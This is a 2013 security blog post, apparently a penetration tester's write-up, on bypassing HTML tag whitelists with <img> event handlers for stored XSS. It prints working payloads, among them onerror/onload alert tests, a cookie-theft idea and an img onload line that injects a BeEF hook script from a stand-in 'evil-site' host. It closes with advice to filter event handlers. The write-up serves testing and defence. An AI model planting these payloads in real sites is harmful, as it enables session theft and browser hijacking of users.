---
id: 1681
title: 'Exotic XSS: The HTML Image Tag'
date: '2013-10-14T13:04:56-05:00'
author: 'Ron Bowes'
layout: revision
guid: 'http://blog.skullsecurity.org/2013/590-revision-v1'
permalink: '/?p=1681'
---

There are the usual XSS tests. And then there are the fun ones. This is a story about a more exotic approach to testing XSS....

I was testing a company that had passed all XSS tests from their pentester. I found that they allowed users to write HTML tags. Of course they didn't permit <script> tags or <iframe> tags. (Well, they did allow those, but that was an oops - no server side filtering.) This company had whitelisted a variety of "safe" tags for use by clients.

That's boring, right? Heh, thanks to Ron, I had a way to abuse their whitelist. (I've since found this in Web Application Hackers Handbook, but I seem to have overlooked it at the time I read it.) Three HTML 4 tags in particular allow javascript to be run from one of the elements and these are: <img>, <object>, and <style>.  
  
You are really unlikely to see <object> and <style> tags permitted, but <img> tags are a bit more common. Note: since my work on this site, I've seen RSnake's [page](http://ha.ckers.org/xss.html "page") and other pages that talk about using <img src="alert('XSS')">. That was nice in the past, but none of my current version browsers will execute that. (Makes me wonder if the whole tracking image thing from emails of yesteryear still works, but that's a rabbit trail. If you know, post a comment.) Still, just because I can't source the javascript, doesn't mean I can't execute javascript.... We'll use different HTML 4 elements.

Now, in my scenario, I decided to input <img src="blah.jpg" onerror="alert('XSS')"/> and reloaded the page. BINGO! I got a popup box. This also works and has the advantage of a working image: <img src="realimage.png" onload="alert('XSS')"/>.

That's cool. It's really easy to check that off on your list and say "vulnerable to XSS." But, can you do anything besides popping boxes? Doing something would be useful. I had a question about all this, "will these elements support more than an alert box or is this a useless novelty?" More tests were in order.

So, then we could replace alert() with document.write() and write the cookie to our server. This swipes cookies and that's better than a popup. But why stop there?

Why not create a <script> on the page itself? What's that you say? <script> isn't on the whitelist? So, your point? If your browser creates the <script> locally, it can't be filtered, now can it?

Thanks to Mak (@mak\_kolybabi) for giving me some of the tips I needed to get this going in the correct direction.

How about we try this:

<img onload="var s = document.createElement('script'); s.src='http://evil-site/beef/hook/beefmagic.js.php';document.getElementsByTagName('head')\[0\].appendChild(s);" src="real\_image.jpg" />

We have a image that triggers the onload element. Now we tell the browser to create a script element. You may not be able to write <script>, but you are able to write the word "script." The createElement function tells the browser to create the <script></script>. It's local to the client and the server has no idea. :-D

Then we give the source element (what else would you use but [BeEF](http://www.bindshell.net "BeEF")?) and then we place our new element into the page. Viola! You've just turned a simple <img> tag into stored XSS....

I have noticed that using onload="local\_function()," IE8 and FF3.6 have "issues." Not sure what it is quite yet.

I spent a few moments looking around to see if I could locate websites that allow you to use HTML tags. From a cursory perspective, Slashdot is safe, so is Digg, and most forums are now using BB Code. So, how useful is this? I'd wager it's probably a last resort. If you chained attacks you could potentially use it. Suppose you bypassed the front line of defense ([like so](http://www.skullsecurity.org/blog/?p=560 "like so")) in a manner that allowed you to write tags, but ran into some sort of whitelist filtering on the server preventing <script> tags. Now you have a way to create script tags while evading the filter.

We're not done yet....

Now, you might think that all of this is trivial and not very important. I mean seriously, who allows users to write tags at all? Let's look forward for a moment. HTML5 is coming. According to this[ site](http://simon.html5.org/html5-elements "site") (and I have to think that they would know), we find this beautiful bit of information: all event handlers must be supported by all elements, or something like that. And there are a bunch of new event handlers.

In other words, not only do we have access to onload/onerror in every element, we get lots more.... Stored XSS will be everywhere for years. All these wannabe web guys who implement the cool new whizbang HTML5 as soon as it ships, will be running huge risks unless they carefully filter out event handlers. (At least they need to prevent users from implementing event handlers.) We've seen how well this has worked in the past, so my hopes for reasonably secure implementation are exactly nonexistent.

And if you have a site that you want to allow users to write tags, try switching to BB Code. It's safer. Well, in 10 minutes of testing I didn't see how to bypass it as it doesn't support anything. :-D

Currently, I am developing a page that will test a browser's support of HTML 5 action events. If you have suggestions or tips, send them my way. I'm currently muddling through my coding.

Oh and just think about what would happen if someone accidentally on purpose managed to rewrite the <img> element on www.digg.com or www.google.com. Would anyone ever notice? How long would it take to find it? Seriously, looking for a compromise, who'd look at the official logo for the infection? Enjoy your nightmares people.

Cheers.